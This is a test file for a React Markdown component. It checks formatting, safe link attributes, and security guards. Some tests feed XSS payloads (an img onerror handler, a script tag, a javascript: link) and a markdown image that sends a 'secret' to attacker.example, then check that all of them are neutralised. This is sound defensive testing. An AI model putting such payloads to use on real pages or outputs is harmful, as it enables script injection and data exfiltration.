import { describe, expect, it } from "vitest";
import { render } from "@testing-library/react";
import { Markdown } from "./Markdown";

describe("Markdown", () => {
  it("renders bold, lists, headings and GFM tables", () => {
    const { container } = render(
      <Markdown>
        {"### Title\n\nSome **bold** number 42.\n\n- one\n- two\n\n| A | B |\n|---|---|\n| 1 | 2 |"}
      </Markdown>,
    );
    expect(container.querySelector("strong")?.textContent).toBe("bold");
    expect(container.querySelectorAll("li")).toHaveLength(2);
    expect(container.querySelector("table")).not.toBeNull();
    expect(container.querySelector("th")?.textContent).toBe("A");
  });

  it("renders injected raw HTML as inert text, never as elements (XSS guard)", () => {
    const { container } = render(
      <Markdown>{'Hi <img src=x onerror="alert(1)"> <script>alert(2)</script>'}</Markdown>,
    );
    expect(container.querySelector("img")).toBeNull();
    expect(container.querySelector("script")).toBeNull();
    expect(container.querySelector("[onerror]")).toBeNull();
  });

  it("opens links in a new tab with a safe rel", () => {
    const { container } = render(<Markdown>{"[link](https://example.com)"}</Markdown>);
    const a = container.querySelector("a");
    expect(a?.getAttribute("target")).toBe("_blank");
    expect(a?.getAttribute("rel")).toContain("noopener");
    expect(a?.getAttribute("href")).toBe("https://example.com");
  });

  it("applies the dark page variant class", () => {
    const { container } = render(<Markdown variant="page">{"hello"}</Markdown>);
    expect(container.querySelector(".prose-chat-page")).not.toBeNull();
  });

  it("drops markdown images — no auto-fetch exfiltration channel (FX-04 / C6)", () => {
    const { container } = render(
      <Markdown>{"before ![leak](https://attacker.example/collect?d=secret) after"}</Markdown>,
    );
    expect(container.querySelector("img")).toBeNull();
    // The alt text / surrounding prose still renders (unwrapDisallowed).
    expect(container.textContent).toContain("before");
    expect(container.textContent).toContain("after");
  });

  it("strips a javascript: link scheme (FX-04)", () => {
    const { container } = render(<Markdown>{"[x](javascript:alert(1))"}</Markdown>);
    const href = container.querySelector("a")?.getAttribute("href") ?? "";
    expect(href.startsWith("javascript:")).toBe(false);
  });
});
